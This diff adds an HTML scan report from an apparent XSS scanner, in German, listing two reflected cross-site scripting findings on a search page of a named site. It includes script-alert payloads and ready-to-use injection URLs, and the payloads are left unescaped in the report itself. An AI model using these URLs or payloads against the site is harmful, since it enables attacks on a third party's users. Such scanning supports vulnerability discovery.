@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Hunter Pro - Scan Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1, h2 { color: #2c3e50; }
+        .vulnerability { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
+        .high { border-left: 5px solid #e74c3c; }
+        .medium { border-left: 5px solid #f39c12; }
+        .low { border-left: 5px solid #3498db; }
+        .details { margin-left: 20px; }
+        pre { background-color: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>XSS Hunter Pro - Scan Report</h1>
+    <p><strong>Datum:</strong> 2025-03-30 20:26:58</p>
+    <p><strong>Ziel:</strong> https://tsg-einslingen.de</p>
+    <p><strong>Scan-Tiefe:</strong> 3</p>
+    <p><strong>Gefundene Schwachstellen:</strong> 2</p>
+    
+    <h2>Schwachstellen</h2>
+
+    <div class="vulnerability medium">
+        <h3>1. REFLECTED_XSS</h3>
+        <div class="details">
+            <p><strong>URL:</strong> https://tsg-einslingen.de/search.php</p>
+            <p><strong>Parameter:</strong> q70</p>
+            <p><strong>Methode:</strong> GET</p>
+            <p><strong>Payload:</strong> <pre><script>alert('lI596jCxgW2z')</script></pre></p>
+            <p><strong>Debug-URL:</strong> <a href="https://tsg-einslingen.de/search.php?q70=%3Cscript%3Ealert%28%27lI596jCxgW2z%27%29%3C/script%3E" target="_blank">https://tsg-einslingen.de/search.php?q70=%3Cscript%3Ealert%28%27lI596jCxgW2z%27%29%3C/script%3E</a></p>
+            <p><strong>Screenshot:</strong> <a href="/home/kali/bounty/Hunter/screenshots/xss_20250330_202657_lI596jCxgW2z.png">xss_20250330_202657_lI596jCxgW2z.png</a></p>
+        </div>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>2. REFLECTED_XSS</h3>
+        <div class="details">
+            <p><strong>URL:</strong> https://tsg-einslingen.de/search.php</p>
+            <p><strong>Parameter:</strong> q140</p>
+            <p><strong>Methode:</strong> GET</p>
+            <p><strong>Payload:</strong> <pre><script>alert('EXPcgQ6uXohV')</script></pre></p>
+            <p><strong>Debug-URL:</strong> <a href="https://tsg-einslingen.de/search.php?q140=%3Cscript%3Ealert%28%27EXPcgQ6uXohV%27%29%3C/script%3E" target="_blank">https://tsg-einslingen.de/search.php?q140=%3Cscript%3Ealert%28%27EXPcgQ6uXohV%27%29%3C/script%3E</a></p>
+            <p><strong>Screenshot:</strong> <a href="/home/kali/bounty/Hunter/screenshots/xss_20250330_202657_EXPcgQ6uXohV.png">xss_20250330_202657_EXPcgQ6uXohV.png</a></p>
+        </div>
+    </div>
+
+</body>
+</html>
